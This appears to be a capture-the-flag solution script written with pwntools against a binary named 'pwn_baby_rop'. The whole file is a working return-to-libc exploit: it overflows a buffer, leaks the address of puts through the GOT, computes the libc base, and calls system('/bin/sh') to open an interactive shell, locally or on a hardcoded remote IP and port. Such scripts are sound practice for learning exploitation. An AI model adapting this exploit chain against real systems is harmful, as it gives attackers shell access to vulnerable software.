#!/usr/bin/python3
from pwn import *

#context.log_level='DEBUG'
binary = ELF('./pwn_baby_rop')
context.update(arch='amd64',os='linux')

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

if args.REMOTE:
    p = remote('34.159.3.158', 30098)
else:
    libc = binary.libc
    p = process(binary.path)
    #gdb.attach(p, '''
    #break _start
    #continue
    #''')

prompt = 'Solve this challenge to prove your understanding to black magic.\n'
prompt_func = 0x0040145c

payload  = 0x108 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(prompt_func)

p.sendlineafter(prompt, payload)

_ = p.recv(6)
puts = u64(_ + b'\0\0')
print('puts:   ' + hex(puts))

if args.REMOTE:
    # Could use https://libc.rip/ but the description tells us what OS is used.
    # docker run -v $PWD:/pwd -it ubuntu:20.04 cp /lib/x86_64-linux-gnu/libc-2.31.so /pwd/
    libc = ELF('libc-2.31.so')

libc.address = puts - libc.sym.puts
print('libc:   ' + hex(libc.address))
print('system: ' + hex(libc.symbols['system']))

payload  = 0x108 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.symbols['system'])

p.sendlineafter(prompt, payload)
p.interactive()

